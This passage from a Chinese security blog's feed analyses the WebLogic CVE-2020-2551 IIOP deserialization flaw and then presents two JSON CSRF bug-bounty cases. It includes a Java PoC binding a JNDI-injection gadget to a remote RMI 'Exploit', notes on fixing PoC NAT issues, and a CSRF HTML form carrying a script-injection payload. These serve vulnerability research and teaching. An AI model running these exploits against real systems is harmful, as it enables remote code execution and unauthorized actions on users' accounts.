<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">port</span> <span class="operator">=</span> <span class="string">&quot;7001&quot;</span>;</span><br><span class="line"></span><br><span class="line">    Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;String, String&gt;();</span><br><span class="line">    env.put(<span class="string">&quot;java.naming.factory.initial&quot;</span>, <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>);</span><br><span class="line">    env.put(<span class="string">&quot;java.naming.provider.url&quot;</span>, String.format(<span class="string">&quot;iiop://%s:%s&quot;</span>, ip, port));</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">    <span class="comment">// get Object to Deserialize</span></span><br><span class="line">    <span class="type">JtaTransactionManager</span> <span class="variable">jtaTransactionManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JtaTransactionManager</span>();</span><br><span class="line">    jtaTransactionManager.setUserTransactionName(<span class="string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>);</span><br><span class="line">    <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="string">&quot;pwned&quot;</span>, jtaTransactionManager), Remote.class);</span><br><span class="line">    context.bind(<span class="string">&quot;hello&quot;</span>, remote);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里使用Ysoserial内建的功能帮我们生成一个实现Remote接口的远程类</p>
<p>至此，整个漏洞的原理：</p>
<ol>
<li><p>通过设置java.naming.provider.url的值为iiop:&#x2F;&#x2F;127.0.0.1:7001获取到对应的InitialContext对象，然后再bind操作的时候会将被绑定的对象进行序列化并发送到IIOP服务端。</p>
</li>
<li><p>Weblogic服务端在获取到请求的字节流时候进行反序列化操作触发漏洞。</p>
</li>
</ol>
<h3 id="Context的生成以及bind的流程"><a href="#Context的生成以及bind的流程" class="headerlink" title="Context的生成以及bind的流程"></a>Context的生成以及bind的流程</h3><p>就如上文中的Demo，利用RMI-IIOP无论是写客户端还是服务端，都需要先获取Context对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br></pre></td></tr></table></figure>

<p>在CORBA通信过程中，这一部分就是获取naming service的过程，对于客户端来说是获取其中存在的IOR引用以供后面的rpc流程使用；对于服务端来说，是用于完成对象注册</p>
<p>为了方便后续理解Weblogic的解析逻辑，新建项目跟一下Context的生成过程，在libraries依旧要添加Weblogic的lib和modules两个目录</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(<span class="string">&quot;java.naming.factory.initial&quot;</span>, <span class="string">&quot;weblogic.jndi.WLInitialContextFactory&quot;</span>);</span><br><span class="line">        env.put(<span class="string">&quot;java.naming.provider.url&quot;</span>, <span class="string">&quot;iiop://192.168.110.3:7001&quot;</span>);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">        context.bind(<span class="string">&quot;l3yx&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>javax.naming.InitialContext#InitialContext(java.util.Hashtable&lt;?,?&gt;)</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421214031788.png" alt="image-20200421214031788"></p>
<p>在environment参数中可以设置Context的静态变量来指定Context的初始化参数，包括JNDI_FACTORY、PROVIDER_URL</p>
<p>javax.naming.InitialContext#init</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421214219158.png" alt="image-20200421214219158"></p>
<p>当在environment中设置了Context.INITIAL_CONTEXT_FACTORY后会尝试获取该Context factory</p>
<p>javax.naming.InitialContext#getDefaultInitCtx</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421214300874.png" alt="image-20200421214300874"></p>
<p>javax.naming.spi.NamingManager#getInitialContext</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421214646760.png" alt="image-20200421214646760"></p>
<p>这里会根据设定的Context.INITIAL_CONTEXT_FACTORY，反射获取工厂类，之后调用其中的getInitialContext方法</p>
<p>这里是Weblogic中所拓展的工程类weblogic.jndi.WLInitialContextFactory</p>
<p>weblogic.jndi.WLInitialContextFactory#getInitialContext</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421220001151.png" alt="image-20200421220001151"></p>
<p>weblogic.jndi.Environment#getContext(java.lang.String, weblogic.rmi.spi.HostID)</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421220058194.png" alt="image-20200421220058194"></p>
<p>weblogic.factories.iiop.iiopEnvironmentFactory#getInitialContext(weblogic.jndi.Environment, java.lang.String)</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421220217536.png" alt="image-20200421220217536"></p>
<p>weblogic.corba.j2ee.naming.InitialContextFactoryImpl#getInitialContext(java.util.Hashtable, java.lang.String)</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421220343294.png" alt="image-20200421220343294"></p>
<p>weblogic.corba.j2ee.naming.ORBHelper#getORBReference</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421220705540.png" alt="image-20200421220705540"></p>
<p>这里和CORBA的写法是一样的，都是初始化orb获取Naming Service的过程，如果想要了解详细的过程，可以参考<a href="https://paper.seebug.org/1124/">Java CORBA</a></p>
<p>在获取了Context后，接着来看一下其绑定流程，此流程在bind函数中有所体现</p>
<p>weblogic.corba.j2ee.naming.ContextImpl#bind(javax.naming.Name, java.lang.Object)</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200421221921678.png" alt="image-20200421221921678"></p>
<p>这里完成的是生成IOR，同时设定corba协议中的数据类型与java类型交互的约定为tk_value，并设定请求的op或者叫做operation为bind_any。这里不仅仅设定了服务端对注册请求的处理方式（bind_any的处理流程），同时设定了后面反序列化的方式（tk_value）</p>
<h3 id="Weblogic解析流程"><a href="#Weblogic解析流程" class="headerlink" title="Weblogic解析流程"></a>Weblogic解析流程</h3><p>在远程调试中下断点，运行<a href="https://github.com/Y4er/CVE-2020-2551">weblogic_CVE_2020_2551.jar</a></p>
<p>weblogic.iiop.ConnectionManager#dispatch</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422145612316.png" alt="image-20200422145612316"></p>
<p>在该函数看到所有 IIOP 的请求信息</p>
<p>weblogic.rmi.cluster.ClusterableServerRef#invoke</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422145827253.png" alt="image-20200422145827253"></p>
<p>weblogic.corba.idl.CorbaServerRef#invoke</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422145953983.png" alt="image-20200422145953983"></p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422150228254.png" alt="image-20200422150228254"></p>
<p>这里首先会判断请求是否为objectMethods中已经存在的类型，当不存在时将会调用delegate.invoke来处理，由于我们在发送注册请求时的请求类型为bind_any&#x2F;rebind_any，并不在objectMethods中，所以会触发delegate._invoke，具体的实现类为</p>
<p>weblogic.corba.cos.naming._NamingContextAnyImplBase#_invoke</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422150921395.png" alt="image-20200422150921395"></p>
<p>因为我们当前的请求类型为rebind_any，其所对应的var5为1，bind_any为0，但都会进入两个关键的流程</p>
<ul>
<li>WNameHelper.read(var2)</li>
<li>var2.read_any()</li>
</ul>
<p>weblogic.corba.cos.naming.NamingContextAnyPackage.WNameHelper#read</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422151050518.png" alt="image-20200422151050518"></p>
<p>weblogic.corba.cos.naming.NamingContextAnyPackage.WNameComponentHelper#read</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422151929872.png" alt="image-20200422151929872"></p>
<p>在WNameHelper.read主要负责提取IOR中的信息（id、kind）用于之后注册到orb的流程中</p>
<p>而反序列化的触发点在var2.read_any中</p>
<p>weblogic.iiop.IIOPInputStream#read_any()</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422152107646.png" alt="image-20200422152107646"></p>
<p>在bind流程中发起注册请求时，会构造一个Any类，并将交互类型设置为tk_value也就是this.read_TypeCode()</p>
<p>weblogic.corba.idl.AnyImpl#read_value_internal</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422152508033.png" alt="image-20200422152508033"></p>
<p>这里会根据TCKind来分派具体的处理流程，tk_value对应29</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422152604876.png" alt="image-20200422152604876"></p>
<p>接下来就是<a href="https://paper.seebug.org/1124/">这篇文章</a>中所提到过的反序列化流程</p>
<p>接着跟踪会运行到</p>
<p>weblogic.iiop.IIOPInputStream#read_value(java.lang.Class)</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154229127.png" alt="image-20200422154229127"></p>
<p>在图中所示处下断点，然后F9，直到为var2为com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager</p>
<p>JtaTransactionManager就是spring爆出的一个可以JNDI注入的类，在weblogic中也存在</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154310751.png" alt="image-20200422154310751"></p>
<p>weblogic.corba.utils.ValueHandlerImpl#allocateValue</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422160041827.png" alt="image-20200422160041827"></p>
<p>allocateValue中通过反射获取实例</p>
<p>weblogic.corba.utils.ValueHandlerImpl#readValue(weblogic.iiop.IIOPInputStream, weblogic.utils.io.ObjectStreamClass, java.lang.Object)</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154530489.png" alt="image-20200422154530489"></p>
<p>weblogic.corba.utils.ValueHandlerImpl#readValueData</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154642371.png" alt="image-20200422154642371"></p>
<p>判断是否有readObject方法之后进入自身的readObject</p>
<p>weblogic.utils.io.ObjectStreamClass#readObject</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154803899.png" alt="image-20200422154803899"></p>
<p>通过反射调用JtaTransactionManager的readObject</p>
<p>com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager#readObject</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422154835199.png" alt="image-20200422154835199"></p>
<p>后面就同<a href="/2020/04/14/Spring-JtaTransactionManager-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Spring JtaTransactionManager 反序列化漏洞</a>了</p>
<h2 id="解决POC-NAT网络问题"><a href="#解决POC-NAT网络问题" class="headerlink" title="解决POC NAT网络问题"></a>解决POC NAT网络问题</h2><h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p>重启了下虚拟机，ip变了，重新编译下恶意类，目前ip</p>
<blockquote>
<p>Windows宿主机ip：192.168.110.1</p>
<p>Linux虚拟机ip：192.168.110.4</p>
<p>Weblogic Docker ip：172.17.0.2</p>
</blockquote>
<h4 id="Linux虚拟机中本地攻击Docker"><a href="#Linux虚拟机中本地攻击Docker" class="headerlink" title="Linux虚拟机中本地攻击Docker"></a>Linux虚拟机中本地攻击Docker</h4><p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422203447874.png" alt="image-20200422203447874"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump -n -i docker0 -w p.cap</span><br></pre></td></tr></table></figure>

<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422203635043.png" alt="image-20200422203635043"></p>
<p>通过IIOP向Weblogic请求NameService</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422203852815.png" alt="image-20200422203852815"></p>
<p>Weblogic返回NameService并指定bind地址，这里为0.0.0.0（参考文章中为Weblogic内网ip，暂不明原因），即指向本机，由于docker的7001端口映射到了虚拟机的7001端口，所以在虚拟机中访问0.0.0.0:7001仍然可以正常访问到Weblogic</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422204635800.png" alt="image-20200422204635800"></p>
<p>客户端请求bind恶意序列化对象</p>
<p>后面就是触发JNDI lookup，加载远程恶意类并成功执行命令</p>
<h4 id="宿主机攻击虚拟机中Docker"><a href="#宿主机攻击虚拟机中Docker" class="headerlink" title="宿主机攻击虚拟机中Docker"></a>宿主机攻击虚拟机中Docker</h4><p>直接用Wireshark抓VMware NAT</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422210424446.png" alt="image-20200422210424446"></p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422210629980.png" alt="image-20200422210629980"></p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422210707879.png" alt="image-20200422210707879"></p>
<p>通过IIOP向Weblogic请求NameService</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422210802102.png" alt="image-20200422210802102"></p>
<p>Weblogic返回NameService并指定bind地址，这里还是为0.0.0.0，那么宿主机会请求到自己的7001端口，自然不能正常与Weblogic交互，导致后续利用失败，可以本地监听7001端口验证一下</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422211108285.png" alt="image-20200422211108285"></p>
<p>其实这里只要通过端口转发把数据交给Weblogic的7001端口即可</p>
<p>实测直接保存数据然后nc再发过去也行</p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422220334597.png" alt="image-20200422220334597"></p>
<p><img src="/Weblogic-IIOP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200422220347793.png" alt="image-20200422220347793"></p>
<h3 id="重写客户端处理逻辑"><a href="#重写客户端处理逻辑" class="headerlink" title="重写客户端处理逻辑"></a>重写客户端处理逻辑</h3><p>参考<a href="https://xz.aliyun.com/t/7498">手把手教你解决Weblogic CVE-2020-2551 POC网络问题</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/QAX-A-Team/WeblogicEnvironment">Weblogic环境搭建工具</a></p>
<p><a href="https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html">IDEA+docker，进行远程漏洞调试（weblogic）</a></p>
<p><a href="https://y4er.com/post/weblogic-cve-2020-2551/">Weblogic CVE-2020-2551 IIOP协议反序列化RCE</a></p>
<p><a href="https://xz.aliyun.com/t/7498">手把手教你解决Weblogic CVE-2020-2551 POC网络问题</a></p>
<p><a href="https://xz.aliyun.com/t/7374">漫谈 WebLogic CVE-2020-2551</a></p>
<p><a href="https://www.cnblogs.com/nliao/p/3308669.html">Corba概念（GIOP、IIOP、IOR、ORB、IDL）</a></p>
<p><a href="https://www.cnblogs.com/mosmith/p/5185379.html">CORBA IOR学习</a></p>
<p><a href="https://www.jianshu.com/p/2662a2c4034a">Corba初体验——概要笔记</a></p>
<p><a href="https://paper.seebug.org/1130/">WebLogic WLS 核心组件 RCE 分析（CVE-2020-2551）</a></p>
<p><a href="https://paper.seebug.org/1105/">关于 Java 中的 RMI-IIOP</a></p>
]]></content>
      <tags>
        <tag>Weblogic</tag>
        <tag>IIOP</tag>
      </tags>
  </entry>
  <entry>
    <title>两则JSON CSRF实例</title>
    <url>/2020/08/27/%E4%B8%A4%E5%88%99JSON-CSRF%E5%AE%9E%E4%BE%8B/</url>
    <content><![CDATA[<p>最近面试被问到JSON CSRF，还刚好挖过他们家SRC两个实际案例，当时挖洞的时候也特地去查过JSON CSRF的资料，可面试的时候怎么也没想起来，遂翻出以前SRC的报告记录一下再整理下JSON CSRF的利用方法</p>
<span id="more"></span>

<h2 id="JSON-CSRF"><a href="#JSON-CSRF" class="headerlink" title="JSON CSRF"></a>JSON CSRF</h2><p>所谓JSON CSRF和普通CSRF的不同及利用难点在于</p>
<ol>
<li><p>POST的包体为JSON格式，而不是键值对，一般HTML表单无法构造</p>
</li>
<li><p>Content-Type 头一般需要设置为 application&#x2F;json，HTML表单同样无法构造</p>
</li>
</ol>
<p>使用XMLHttpRequest、fetch能构造出JSON请求，并且能设置Content-Type，但是无法跨域</p>
<p>所以在服务端严格校验JSON格式和Content-Type的情况下，目前的解决方案我只找到利用Flash的跨域与307跳转（具体见参考文章），但Flash无疑已经过时了，某些浏览器也默认禁止了Flash运行。所以我挖到的两个”JSON CSRF”应该都不算严格意义上的JSON CSRF，而是寻找到了其他绕过的方式</p>
<h2 id="未验证Content-Type头且未严格校验JSON格式案例"><a href="#未验证Content-Type头且未严格校验JSON格式案例" class="headerlink" title="未验证Content-Type头且未严格校验JSON格式案例"></a>未验证Content-Type头且未严格校验JSON格式案例</h2><p>直接复制当时报告中的描述了</p>
<p>对关注列表取消关注再关注时可抓到关注请求包，经测试url中的_signature参数无校验作用。csrf_token存于cookie， 无效。所以可构造CSRF，但是这里是JSON格式请求包，用XMLHttpRequest构造的话存在跨域问题无法解决</p>
<p><img src="/%E4%B8%A4%E5%88%99JSON-CSRF%E5%AE%9E%E4%BE%8B/image-20200827230154850.png" alt="image-20200827230154850"></p>
<p>但是发现服务器对JSON数据有容错性，即JSON数据后多了个等号依旧能正常识别，而且服务器不校验Content-Type头，故构造一般的html表单，name为JSON数据即可</p>
<p><img src="/%E4%B8%A4%E5%88%99JSON-CSRF%E5%AE%9E%E4%BE%8B/image-20200827230320096.png" alt="image-20200827230320096"></p>
<h2 id="严格验证Content-Type头和JSON格式案例"><a href="#严格验证Content-Type头和JSON格式案例" class="headerlink" title="严格验证Content-Type头和JSON格式案例"></a>严格验证Content-Type头和JSON格式案例</h2><p>直接创建日程放入payload即可收获一个self xss，但selfx没用，然后发现没有csrftoken及referer和orgin的验证，可配合CSRF</p>
<p>但由于body是JSON格式(如下)，而且服务器对JSON没有容错性，也会验证Content-Type，一般的CSRF表单无法构造</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;timezone&quot;</span><span class="punctuation">:</span><span class="string">&quot;Asia/Shanghai&quot;</span><span class="punctuation">,</span><span class="attr">&quot;isAllDay&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;reminders&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;minutes&quot;</span><span class="punctuation">:</span><span class="number">60</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span><span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;rrule&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;start&quot;</span><span class="punctuation">:</span><span class="number">1588465800</span><span class="punctuation">,</span><span class="attr">&quot;end&quot;</span><span class="punctuation">:</span><span class="number">1588469400</span><span class="punctuation">,</span><span class="attr">&quot;hasAlarm&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后手动修改参数为键值对形式，Content-Type为application&#x2F;x-www-form-urlencoded，服务端依旧可以正常识别，还有问题的就是<code>&quot;reminders&quot;: [&#123;&quot;minutes&quot;:60&#125;]</code>是一个数组对象，反复测试发现可以这样构造<code>reminders[][minutes]=60</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&lt;script&gt;alert(1);&lt;/script&gt;&amp;type=1&amp;timezone=Asia/Shanghai&amp;isAllDay=0&amp;reminders[][minutes]=60&amp;description=&amp;rrule=&amp;start=158847840&amp;hasAlarm=1</span><br></pre></td></tr></table></figure>

<p>然后用burp自动生成CSRF POC，但是失败，没发现原因，自己手工构造后测试发现网页返回错误，最后才发现网站是用的PUT请求</p>
<p><img src="/%E4%B8%A4%E5%88%99JSON-CSRF%E5%AE%9E%E4%BE%8B/image-20200827230931506.png" alt="image-20200827230931506"></p>
<p>用表单只能构造GET&#x2F;POST请求，仿佛又要放弃了，但是最后查阅资料多次测试下，发现加入_method&#x3D;PUT即可，最后POC如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://www.xxxxx.com/xxxx?_method=PUT&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span><span class="symbol">&amp;#59;</span><span class="symbol">&amp;lt;</span><span class="symbol">&amp;#47;</span>script<span class="symbol">&amp;gt;</span>&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;type&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;timezone&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Asia<span class="symbol">&amp;#47;</span>Shanghai&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;isAllDay&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;reminders<span class="symbol">&amp;#91;</span><span class="symbol">&amp;#93;</span><span class="symbol">&amp;#91;</span>minutes<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;60&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;rrule&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;start&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1588478400&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;end&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1588482000&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hasAlarm&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/206407.html">谈谈Json格式下的CSRF攻击</a></p>
<p><a href="https://www.freebuf.com/vuls/230243.html">挖洞经验 | 用HTTP请求重写实现JSON CSRF</a></p>
]]></content>
      <tags>
        <tag>JSON CSRF</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title>用CodeQL分析漏洞_CVE-2022-42889</title>
    <url>/2022/12/17/%E7%94%A8CodeQL%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E-CVE-2022-42889/</url>
